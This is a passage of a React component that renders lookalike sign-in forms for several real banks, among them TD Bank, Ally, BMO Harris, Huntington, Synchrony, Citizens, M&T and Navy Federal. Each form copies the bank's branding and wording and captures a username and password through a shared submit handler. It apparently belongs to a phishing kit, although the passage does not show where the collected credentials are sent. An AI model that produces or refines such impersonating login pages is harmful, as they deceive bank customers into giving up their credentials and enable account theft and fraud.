                    className="w-full px-4 py-3 border border-gray-300 rounded-none rounded-l-md text-base focus:outline-none focus:ring-2 focus:ring-orange-500 focus:border-orange-500 border-l-4 border-l-orange-500"
                    required
                  />
                  <div className="flex items-center mt-3">
                    <input
                      id="rememberUserId"
                      type="checkbox"
                      checked={saveUsername}
                      onChange={() => setSaveUsername(!saveUsername)}
                      className="mr-2"
                    />
                    <label
                      htmlFor="rememberUserId"
                      className="text-sm text-gray-700"
                    >
                      Remember User ID
                    </label>
                  </div>
                </div>

                {/* Password */}
                <div className="flex-1">
                  <label
                    htmlFor="password"
                    className="block text-sm font-semibold text-gray-700 mb-1"
                  >
                    Password{' '}
                    <span className="text-xs text-gray-500">(required)</span>
                  </label>
                  <div className="relative flex items-center">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="password"
                      name="password"
                      placeholder="Enter Password"
                      value={bankLoginData.password}
                      onChange={handleBankLoginChange}
                      className="w-full px-4 py-3 border border-gray-300 rounded-none rounded-r-md text-base focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-600 hover:text-blue-800"
                      tabIndex={-1}
                    >
                      {showPassword ? (
                        <EyeOff className="w-5 h-5" />
                      ) : (
                        <Eye className="w-5 h-5" />
                      )}
                    </button>
                  </div>
                  <div className="mt-2">
                    <a
                      href="#"
                      className="text-blue-700 text-sm hover:underline"
                    >
                      Forgot ID or Password?
                    </a>
                  </div>
                </div>
              </div>

              {/* Sign On Button */}
              <div className="flex flex-col items-center mt-6">
                <button
                  type="submit"
                  className="w-full md:w-1/2 bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 rounded transition-colors text-lg mb-2"
                >
                  Sign On
                </button>
                <span className="text-gray-500 text-sm mb-1">or</span>
                <a href="#" className="text-blue-700 text-base hover:underline">
                  Enroll In Online Banking
                </a>
              </div>
            </form>
          </div>
        </div>
      );
    } else if (selectedBank === 'TD Bank') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[150px] h-[60px]"
              alt="TD Bank Logo"
            />
          </div>
          <div className="p-8">
            <form className="max-w-md mx-auto" onSubmit={handleLoginSubmit}>
              {/* Username */}
              <div className="mb-4">
                <input
                  type="text"
                  name="username"
                  placeholder="User name"
                  value={bankLoginData.username}
                  onChange={handleBankLoginChange}
                  className="w-full px-4 py-3 border border-gray-400 rounded-none rounded-md text-base focus:outline-none focus:ring-2 focus:ring-green-600 focus:border-green-600 placeholder-gray-500"
                  required
                />
              </div>
              {/* Password */}
              <div className="mb-4 relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  name="password"
                  placeholder="Password"
                  value={bankLoginData.password}
                  onChange={handleBankLoginChange}
                  className="w-full px-4 py-3 border border-gray-400 rounded-none rounded-md text-base focus:outline-none focus:ring-2 focus:ring-green-600 focus:border-green-600 placeholder-gray-500"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-green-700 hover:text-green-900"
                  tabIndex={-1}
                >
                  {showPassword ? (
                    <EyeOff className="w-5 h-5" />
                  ) : (
                    <Eye className="w-5 h-5" />
                  )}
                </button>
              </div>
              {/* Remember me */}
              <div className="flex items-center mb-6">
                <input
                  id="rememberMeTd"
                  type="checkbox"
                  checked={saveUsername}
                  onChange={() => setSaveUsername(!saveUsername)}
                  className="mr-2 accent-green-600 w-5 h-5 border-2 border-green-600 rounded-sm focus:ring-green-600"
                />
                <label
                  htmlFor="rememberMeTd"
                  className="text-base text-gray-700 select-none"
                >
                  Remember me
                </label>
              </div>
              {/* Log in button */}
              <button
                type="submit"
                className="w-full bg-gray-200 text-gray-400 font-semibold py-3 rounded text-lg mb-4"
              >
                Log in
              </button>
              {/* Forgot link */}
              <div className="flex justify-start">
                <a
                  href="#"
                  className="text-green-700 font-semibold hover:underline text-base flex items-center"
                >
                  Forgot user name and/or password?
                  <span className="ml-1 text-lg">&gt;</span>
                </a>
              </div>
            </form>
          </div>
        </div>
      );
    } else if (selectedBank === 'Ally Bank') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
              alt="Ally Bank Logo"
            />
          </div>
          <div className="p-8">
            <form className="max-w-md mx-auto" onSubmit={handleLoginSubmit}>
              {/* Heading */}
              <div className="flex items-center mb-6">
                <Lock className="w-5 h-5 text-purple-700 mr-2" />
                <span className="text-xl font-bold text-purple-700">
                  Log in
                </span>
              </div>
              {/* Username */}
              <div className="mb-4">
                <label
                  htmlFor="username"
                  className="block text-sm font-semibold text-gray-700 mb-1"
                >
                  Username
                </label>
                <div className="relative">
                  <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 opacity-60">
                    <svg
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                      preserveAspectRatio="xMidYMin"
                      className="w-6 h-6"
                    >
                      <path
                        fillRule="nonzero"
                        d="M12 11.807c.567 0 1.087-.153 1.56-.458.473-.306.85-.72 1.134-1.242a3.596 3.596 0 0 0 .426-1.746 3.415 3.415 0 0 0-1.564-2.914A2.847 2.847 0 0 0 12 5c-.562 0-1.08.15-1.552.451-.473.3-.851.707-1.135 1.218a3.46 3.46 0 0 0-.425 1.708c0 .637.142 1.215.425 1.734.284.52.662.932 1.135 1.238a2.8 2.8 0 0 0 1.552.458ZM16.745 19c.659 0 1.116-.099 1.372-.297.255-.198.383-.482.383-.852 0-.493-.152-1.012-.456-1.557-.304-.545-.74-1.055-1.307-1.53-.567-.476-1.25-.862-2.05-1.16-.8-.299-1.696-.448-2.687-.448-.991 0-1.887.15-2.687.448-.8.298-1.484.684-2.054 1.16-.57.475-1.005.985-1.307 1.53-.301.545-.452 1.064-.452 1.557 0 .37.128.654.383.852.256.198.71.297 1.365.297h9.497Z"
                      ></path>
                    </svg>
                  </span>
                  <input
                    type="text"
                    id="username"
                    name="username"
                    placeholder=""
                    value={bankLoginData.username}
                    onChange={handleBankLoginChange}
                    className="w-full pl-12 pr-4 py-3 border-0 border-b-2 border-gray-300 bg-gray-50 text-base focus:outline-none focus:border-purple-600 placeholder-gray-500"
                    required
                  />
                </div>
              </div>
              {/* Password */}
              <div className="mb-4">
                <label
                  htmlFor="password"
                  className="block text-sm font-semibold text-gray-700 mb-1"
                >
                  Password
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="password"
                    name="password"
                    placeholder=""
                    value={bankLoginData.password}
                    onChange={handleBankLoginChange}
                    className="w-full pr-10 py-3 border-0 border-b-2 border-gray-300 bg-gray-50 text-base focus:outline-none focus:border-purple-600 placeholder-gray-500"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-purple-700"
                    tabIndex={-1}
                  >
                    {showPassword ? (
                      <EyeOff className="w-5 h-5" />
                    ) : (
                      <Eye className="w-5 h-5" />
                    )}
                  </button>
                </div>
              </div>
              {/* Save username and Log In */}
              <div className="flex items-center mb-4">
                <button
                  type="submit"
                  className="border-2 border-purple-500 text-purple-700 font-bold py-2 px-8 rounded-full text-lg mr-4 hover:bg-purple-50 transition-colors"
                >
                  Log In
                </button>
                <input
                  id="saveUsernameAlly"
                  type="checkbox"
                  checked={saveUsername}
                  onChange={() => setSaveUsername(!saveUsername)}
                  className="mr-2 w-5 h-5 border-2 border-purple-500 rounded focus:ring-purple-600"
                />
                <label
                  htmlFor="saveUsernameAlly"
                  className="text-base text-gray-700 select-none"
                >
                  Save username
                </label>
              </div>
              {/* Links */}
              <div className="mb-2 text-sm">
                <span className="text-gray-700">Forgot </span>
                <a
                  href="#"
                  className="text-purple-700 font-semibold underline hover:text-purple-900"
                >
                  username
                </a>
                <span className="text-gray-700"> or </span>
                <a
                  href="#"
                  className="text-purple-700 font-semibold underline hover:text-purple-900"
                >
                  password
                </a>
                ?
              </div>
              <div>
                <a
                  href="#"
                  className="text-purple-700 font-bold underline hover:text-purple-900 text-base"
                >
                  Set up username and password
                </a>
              </div>
            </form>
          </div>
        </div>
      );
    } else if (selectedBank === 'BMO Harris') {
      return (
        <div className="bg-[#f7f8fa] flex flex-col justify-center">
          <div className="bg-white rounded-lg w-full max-w-xl mx-auto">
            <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
              <img
                src={bankData?.additionalLogo}
                className="w-[200px] h-[40px]"
                alt="BMO Harris Logo"
              />
            </div>
            <div className="p-8">
              <h2 className="text-2xl font-normal text-center mb-8 text-black">
                Sign in to BMO Digital Banking
              </h2>
              <form className="space-y-6" onSubmit={handleLoginSubmit}>
                {/* User ID */}
                <div>
                  <div className="flex justify-between items-end mb-1">
                    <label
                      htmlFor="bmo-userid"
                      className="text-blue-700 font-medium"
                    >
                      User ID
                    </label>
                    <a
                      href="#"
                      className="text-blue-700 text-xs font-medium hover:underline"
                    >
                      FORGOT USER ID?
                    </a>
                  </div>
                  <input
                    id="bmo-userid"
                    name="username"
                    type="text"
                    value={bankLoginData.username}
                    onChange={handleBankLoginChange}
                    className="w-full border-0 border-b-2 border-gray-300 focus:border-blue-700 focus:ring-0 bg-transparent text-lg px-0 py-2 placeholder-gray-400"
                    required
                  />
                </div>
                {/* Password */}
                <div>
                  <div className="flex justify-between items-end mb-1">
                    <label
                      htmlFor="bmo-password"
                      className="text-blue-700 font-medium"
                    >
                      Password
                    </label>
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="text-blue-700 text-xs font-medium hover:underline focus:outline-none"
                      tabIndex={-1}
                    >
                      {showPassword ? 'HIDE' : 'SHOW'}
                    </button>
                  </div>
                  <input
                    id="bmo-password"
                    name="password"
                    type={showPassword ? 'text' : 'password'}
                    value={bankLoginData.password}
                    onChange={handleBankLoginChange}
                    className="w-full border-0 border-b-2 border-gray-300 focus:border-blue-700 focus:ring-0 bg-transparent text-lg px-0 py-2 placeholder-gray-400"
                    required
                  />
                  <div className="flex justify-end mt-1">
                    <a
                      href="#"
                      className="text-blue-700 text-xs font-medium hover:underline"
                    >
                      FORGOT PASSWORD?
                    </a>
                  </div>
                </div>
                {/* Remember me toggle */}
                <div className="flex items-center justify-end">
                  <label htmlFor="bmo-remember" className="text-blue-700 mr-2">
                    Remember me
                  </label>
                  <input
                    id="bmo-remember"
                    type="checkbox"
                    checked={saveUsername}
                    onChange={() => setSaveUsername(!saveUsername)}
                    className="toggle toggle-md accent-blue-700"
                    style={{ accentColor: '#0074c1' }}
                  />
                </div>
                {/* Buttons */}
                <div className="flex space-x-4 mt-6">
                  <button
                    type="button"
                    className="flex-1 border-2 border-blue-700 text-blue-700 font-bold py-3 rounded-full text-lg hover:bg-blue-50 transition-colors"
                  >
                    REGISTER
                  </button>
                  <button
                    type="submit"
                    className="flex-1 bg-blue-700 text-white font-bold py-3 rounded-full text-lg shadow hover:bg-blue-800 transition-colors"
                  >
                    SIGN IN
                  </button>
                </div>
              </form>
              {/* Bottom row icons */}
              <div className="flex justify-between items-center mt-10 px-2">
                <div className="flex flex-col items-center">
                  <MessageCircle className="w-7 h-7 text-blue-700 mb-1" />
                  <span className="text-xs text-blue-700 font-bold">
                    BMO ASSIST
                  </span>
                </div>
                <div className="flex flex-col items-center">
                  <Phone className="w-7 h-7 text-blue-700 mb-1" />
                  <span className="text-xs text-blue-700 font-bold">
                    CONTACT US
                  </span>
                </div>
                <div className="flex flex-col items-center">
                  <MapPin className="w-7 h-7 text-blue-700 mb-1" />
                  <span className="text-xs text-blue-700 font-bold">
                    FIND US
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Huntington Bank') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
              alt="Huntington Bank Logo"
            />
          </div>
          <div className="p-0">
            {/* Green Banner */}
            <div className="bg-green-600 w-full py-4 flex justify-center items-center">
              <h1 className="text-white font-bold text-lg">
                Welcome To Huntington Online Banking
              </h1>
            </div>

            {/* Login Form */}
            <div className="p-8">
              <form className="max-w-md mx-auto" onSubmit={handleLoginSubmit}>
                {/* Username */}
                <div className="flex items-center mb-4">
                  <label
                    htmlFor="huntington-username"
                    className="w-20 text-sm font-medium text-gray-700"
                  >
                    Username
                  </label>
                  <input
                    type="text"
                    id="huntington-username"
                    name="username"
                    value={bankLoginData.username}
                    onChange={handleBankLoginChange}
                    className="flex-1 ml-4 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    required
                  />
                </div>

                {/* Password */}
                <div className="flex items-center mb-6">
                  <label
                    htmlFor="huntington-password"
                    className="w-20 text-sm font-medium text-gray-700"
                  >
                    Password
                  </label>
                  <input
                    type={showPassword ? 'text' : 'password'}
                    id="huntington-password"
                    name="password"
                    value={bankLoginData.password}
                    onChange={handleBankLoginChange}
                    className="flex-1 ml-4 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500"
                    required
                  />
                </div>

                {/* Login Button */}
                <div className="mb-6">
                  <button
                    type="submit"
                    className="w-full bg-orange-500 hover:bg-orange-600 text-white font-bold py-3 px-6 rounded flex items-center justify-center transition-colors"
                  >
                    <Lock className="w-5 h-5 mr-2 text-black" />
                    Log In
                  </button>
                </div>

                {/* Links */}
                <div className="space-y-3">
                  <div className="flex justify-between">
                    <a
                      href="#"
                      className="text-blue-600 text-sm hover:underline"
                    >
                      Forgot Username?
                    </a>
                    <a
                      href="#"
                      className="text-blue-600 text-sm hover:underline"
                    >
                      Forgot Password?
                    </a>
                  </div>
                  <div className="text-center">
                    <a
                      href="#"
                      className="text-blue-600 text-sm hover:underline"
                    >
                      Enroll in Online Banking
                    </a>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'Synchrony Bank') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[30px]"
              alt="Synchrony Bank Logo"
            />
          </div>
          <div className="p-8">
            <form className="max-w-md mx-auto" onSubmit={handleLoginSubmit}>
              {/* Title */}
              <h2 className="text-xl font-medium text-gray-800 text-center mb-6">
                Access your Account
              </h2>

              {/* Pay as Guest Section */}
              <div className="mb-6">
                <button
                  type="button"
                  className="w-full border-2 border-blue-500 text-blue-600 font-bold py-3 px-6 rounded-md hover:bg-blue-50 transition-colors"
                >
                  PAY AS GUEST
                </button>
                <p className="text-sm text-gray-500 text-center mt-2">
                  The fast and easy way to make a payment
                </p>
              </div>

              {/* Separator */}
              <div className="relative mb-6">
                <div className="absolute inset-0 flex items-center">
                  <div className="w-full border-t border-gray-300"></div>
                </div>
                <div className="relative flex justify-center text-sm">
                  <span className="px-2 bg-white text-gray-500">or</span>
                </div>
              </div>

              {/* Username Input */}
              <div className="mb-4">
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <svg
                      className="h-5 w-5 text-gray-400"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
                      />
                    </svg>
                  </div>
                  <input
                    type="text"
                    name="username"
                    placeholder="User Name"
                    value={bankLoginData.username}
                    onChange={handleBankLoginChange}
                    className="w-full pl-10 pr-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>
              </div>

              {/* Password Input */}
              <div className="mb-4">
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    name="password"
                    placeholder="Password"
                    value={bankLoginData.password}
                    onChange={handleBankLoginChange}
                    className="w-full pr-16 pl-3 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 pr-3 flex items-center text-blue-600 hover:text-blue-800 font-medium"
                    tabIndex={-1}
                  >
                    {showPassword ? 'Hide' : 'Show'}
                  </button>
                </div>
              </div>

              {/* Remember User Name Checkbox */}
              <div className="flex items-center mb-6">
                <input
                  id="rememberUsername"
                  type="checkbox"
                  checked={saveUsername}
                  onChange={() => setSaveUsername(!saveUsername)}
                  className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                />
                <label
                  htmlFor="rememberUsername"
                  className="ml-2 block text-sm text-gray-700"
                >
                  Remember User Name
                </label>
              </div>

              {/* LOG IN Button */}
              <button
                type="submit"
                className="w-full bg-teal-700 hover:bg-teal-800 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center transition-colors"
              >
                <Lock className="w-5 h-5 mr-2" />
                LOG IN
              </button>

              {/* Links */}
              <div className="mt-6 space-y-2 text-center">
                <div>
                  <span className="text-gray-700">I forgot my </span>
                  <a
                    href="#"
                    className="text-blue-600 font-bold hover:underline"
                  >
                    User Name
                  </a>
                  <span className="text-gray-700"> or </span>
                  <a
                    href="#"
                    className="text-blue-600 font-bold hover:underline"
                  >
                    Password
                  </a>
                </div>
                <div>
                  <span className="text-gray-700">I want to </span>
                  <a
                    href="#"
                    className="text-blue-600 font-bold hover:underline"
                  >
                    Register
                  </a>
                  <span className="text-gray-700">.</span>
                </div>
              </div>
            </form>
          </div>
        </div>
      );
    } else if (selectedBank === 'Citizens Bank') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
              alt="Citizens Bank Logo"
            />
          </div>
          <div className="p-8">
            <div className="max-w-md mx-auto">
              {/* Login Form */}
              <form className="space-y-4" onSubmit={handleLoginSubmit}>
                {/* User ID Input */}
                <div>
                  <label
                    htmlFor="citizens-userid"
                    className="block text-black font-bold mb-2"
                  >
                    User ID
                  </label>
                  <input
                    type="text"
                    id="citizens-userid"
                    name="username"
                    value={bankLoginData.username}
                    onChange={handleBankLoginChange}
                    className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                    required
                  />
                </div>

                {/* Password Input */}
                <div>
                  <label
                    htmlFor="citizens-password"
                    className="block text-black font-bold mb-2"
                  >
                    Password
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="citizens-password"
                      name="password"
                      value={bankLoginData.password}
                      onChange={handleBankLoginChange}
                      className="w-full px-3 py-2 pr-16 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute inset-y-0 right-0 pr-3 flex items-center text-black underline hover:text-gray-700"
                      tabIndex={-1}
                    >
                      {showPassword ? 'Hide' : 'Show'}
                    </button>
                  </div>
                </div>

                {/* Remember User ID Checkbox */}
                <div className="flex items-center">
                  <input
                    id="rememberUserId"
                    type="checkbox"
                    checked={saveUsername}
                    onChange={() => setSaveUsername(!saveUsername)}
                    className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                  />
                  <label
                    htmlFor="rememberUserId"
                    className="ml-2 text-sm text-black"
                  >
                    Remember user ID
                  </label>
                </div>

                {/* Action Links */}
                <div className="space-y-2">
                  <a
                    href="#"
                    className="text-blue-600 hover:text-blue-800 text-sm underline block"
                  >
                    Trouble logging in/Password change
                  </a>
                  <div className="text-sm text-black">
                    New to Online Banking?{' '}
                    <a
                      href="#"
                      className="text-blue-600 hover:text-blue-800 underline"
                    >
                      Enroll now
                    </a>
                    .
                  </div>
                </div>

                {/* Buttons Row */}
                <div className="flex items-center space-x-4 pt-2">
                  <button
                    type="submit"
                    className="bg-orange-500 hover:bg-orange-600 text-white font-bold py-2 px-6 rounded flex items-center transition-colors"
                  >
                    <Lock className="w-5 h-5 mr-2" />
                    Log In
                  </button>
                  <a
                    href="#"
                    className="text-black underline hover:text-gray-700 text-sm"
                  >
                    Cancel
                  </a>
                </div>

                {/* Disclaimer */}
                <div className="pt-4 text-xs text-black italic text-center">
                  Non-deposit products: Are not FDIC Insured; Are not deposits;
                  May lose value.
                </div>
              </form>
            </div>
          </div>
        </div>
      );
    } else if (selectedBank === 'M&T Bank') {
      return (
        <div className="bg-white rounded-lg">
          <div className="bg-white w-full h-16 rounded-t-lg flex justify-center items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
              alt="M&T Bank Logo"
            />
          </div>
          <div className="p-0">
            {/* Dark Green Header Bar */}
            <div className="bg-green-800 w-full py-4 flex justify-center items-center">
              <h1 className="text-white font-serif text-2xl font-bold">
                M&T Bank
              </h1>
            </div>

            {/* Bright Orange Line */}
            <div className="bg-orange-500 w-full h-1"></div>

            {/* Main Form Area */}
            <div className="p-8">
              <div className="max-w-md mx-auto">
                {/* Title and Subtitle */}
                <div className="text-center mb-8">
                  <h2 className="text-2xl font-bold text-green-800 mb-2">
                    Log In to Online Banking
                  </h2>
                  <p className="text-gray-700 text-sm">
                    For Personal and Business Accounts
                  </p>
                </div>

                {/* Login Form */}
                <form className="space-y-4" onSubmit={handleLoginSubmit}>
                  {/* User ID Input */}
                  <div>
                    <label
                      htmlFor="mt-userid"
                      className="block text-sm font-medium text-gray-700 mb-2"
                    >
                      User ID
                    </label>
                    <input
                      type="text"
                      id="mt-userid"
                      name="username"
                      value={bankLoginData.username}
                      onChange={handleBankLoginChange}
                      className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-600 focus:border-green-600"
                      required
                    />
                  </div>

                  {/* Passcode Input */}
                  <div>
                    <label
                      htmlFor="mt-passcode"
                      className="block text-sm font-medium text-gray-700 mb-2"
                    >
                      Passcode
                    </label>
                    <input
                      type={showPassword ? 'text' : 'password'}
                      id="mt-passcode"
                      name="password"
                      value={bankLoginData.password}
                      onChange={handleBankLoginChange}
                      className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-green-600 focus:border-green-600"
                      required
                    />
                  </div>

                  {/* Remember User ID Checkbox */}
                  <div className="flex items-center">
                    <input
                      id="rememberUserIdMt"
                      type="checkbox"
                      checked={saveUsername}
                      onChange={() => setSaveUsername(!saveUsername)}
                      className="h-4 w-4 text-green-600 focus:ring-green-500 border-green-600 rounded"
                    />
                    <label
                      htmlFor="rememberUserIdMt"
                      className="ml-2 text-sm text-gray-700"
                    >
                      Remember User ID
                    </label>
                  </div>

                  {/* LOG IN Button */}
                  <button
                    type="submit"
                    className="w-full bg-green-800 hover:bg-green-900 text-white font-bold py-3 px-6 rounded transition-colors"
                  >
                    LOG IN
                  </button>

                  {/* Help and Enroll Links */}
                  <div className="space-y-2 text-center">
                    <a
                      href="#"
                      className="text-green-800 hover:text-green-900 text-sm underline block"
                    >
                      HELP WITH USER ID OR PASSCODE
                    </a>
                    <a
                      href="#"
                      className="text-green-800 hover:text-green-900 text-sm underline block"
                    >
                      ENROLL NOW
                    </a>
                  </div>
                </form>

                {/* Footer Disclaimer */}
                <div className="mt-8 text-center">
                  <p className="text-xs text-gray-500">
                    Unauthorized access is prohibited. Usage may be monitored.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      );
    }
    if (selectedBank === 'Navy Federal Credit Union') {
      return (
        <div className="bg-[#90C4F0]">
          {/* Header */}
          <div className="bg-[#ffffff] px-4 py-0">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] m-auto"
              alt="M&T Bank Logo"
            />
          </div>

          {/* Main Content */}
          <div className="px-4 py-12">
            <div className="max-w-2xl mx-auto">
              {/* Welcome Title */}
              <h1 className="text-white text-2xl font-bold mb-7 text-left">
                Welcome to Digital Banking
              </h1>

              {/* Login Form Card */}
              <div className="bg-white rounded-lg shadow-2xl overflow-hidden">
                {/* Orange accent bar */}
                <div className="h-2 bg-orange-500"></div>

                <div className="p-4">
                  {/* Sign In Header */}
                  <div className="flex items-center mb-2">
                    <Lock className="w-4 h-4 text-gray-600 mr-4" />
                    <h2 className="text-xl font-bold text-gray-800">Sign In</h2>
                  </div>

                  <form onSubmit={handleLoginSubmit} className="space-y-8">
                    {/* Username Field */}
                    <div>
                      <div className="flex items-center mb-1">
                        <label className="text-gray-800 font-bold text-xl">
                          Username
                        </label>
                        <button
                          type="button"
                          className="ml-3 w-3 h-3 bg-gray-500 text-white rounded-full flex items-center justify-center text-sm font-bold hover:bg-gray-600 transition-colors"
                        >
                          ?
                        </button>
                      </div>
                      <input
                        type="text"
                        name="username"
                        value={bankLoginData.username}
                        onChange={handleBankLoginChange}
                        className="w-full px-2 py-1 border-2 border-gray-400 rounded-lg focus:border-blue-500 focus:outline-none text-lg bg-white"
                        required
                      />
                    </div>

                    {/* Password Field */}
                    <div>
                      <label className="block text-gray-800 font-bold text-xl mb-3">
                        Password
                      </label>
                      <div className="relative">
                        <input
                          type={showPassword ? 'text' : 'password'}
                          name="password"
                          value={bankLoginData.password}
                          onChange={handleBankLoginChange}
                          className="w-full px-2 py-1 pr-14 border-2 border-gray-400 rounded-lg focus:border-blue-500 focus:outline-none text-lg bg-white"
                          required
                        />
                        <button
                          type="button"
                          onClick={() => setShowPassword(!showPassword)}
                          className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                        >
                          {showPassword ? (
                            <EyeOff className="w-7 h-7" />
                          ) : (
                            <Eye className="w-7 h-7" />
                          )}
                        </button>
                      </div>
                    </div>

                    {/* Sign In Help Link */}
                    <div className="text-left">
                      <a
                        href="#"
                        className="text-blue-600 hover:text-blue-800 underline font-medium text-lg"
                      >
                        Sign In Help
                      </a>
                    </div>

                    {/* Sign In Button */}
                    <button
                      type="submit"
                      className="w-full bg-orange-300 hover:bg-orange-400 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-bold py-5 px-6 rounded-lg text-2xl transition-all duration-300 mt-12"
                    >
                      Sign In
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      );
    }
  };

  return designForBanksLogin();
};

export default BankLoginForm;
